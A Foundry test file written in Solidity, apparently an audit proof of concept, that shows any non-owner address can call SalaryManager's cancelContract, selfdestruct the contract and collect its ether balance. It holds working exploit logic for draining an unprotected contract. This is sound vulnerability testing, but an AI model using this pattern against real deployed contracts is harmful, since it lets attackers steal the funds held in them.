
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager private salaryManager;
    address private owner;

    function setUp() public {
        owner = address(this);
        salaryManager = new SalaryManager();
        
        // Fund the contract to ensure it has some balance
        vm.deal(address(salaryManager), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself (which is the owner)
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the only privileged role that should be able to call cancelContract)
        vm.assume(caller != owner);
        
        // Exclude the contract itself
        vm.assume(caller != address(salaryManager));

        // --- 2. State Configuration ---
        // The cancelContract function requires: _totalAllocated < address(this).balance
        // Since we funded the contract with 10 ether and _totalAllocated is 0, this condition is met.
        
        // Store the contract's code before the attack to verify destruction
        uint256 codeSize;
        address targetAddress = address(salaryManager);
        assembly {
            codeSize := extcodesize(targetAddress)
        }
        assertGt(codeSize, 0, "Contract should exist before attack");
        
        // Store the caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalance = address(salaryManager).balance;

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the vulnerable function - this should succeed even though caller is not the owner
        // This proves the vulnerability: any arbitrary user can call cancelContract
        salaryManager.cancelContract();

        // Assert that the caller received the contract's funds via selfdestruct
        assertEq(caller.balance, callerBalanceBefore + contractBalance, "Caller should receive contract funds");
        
        // After selfdestruct, the contract code is destroyed (in post-Cancun, balance is transferred but code remains until end of tx)
        // The key assertion is that the unauthorized caller successfully executed the function and received funds
    }
}
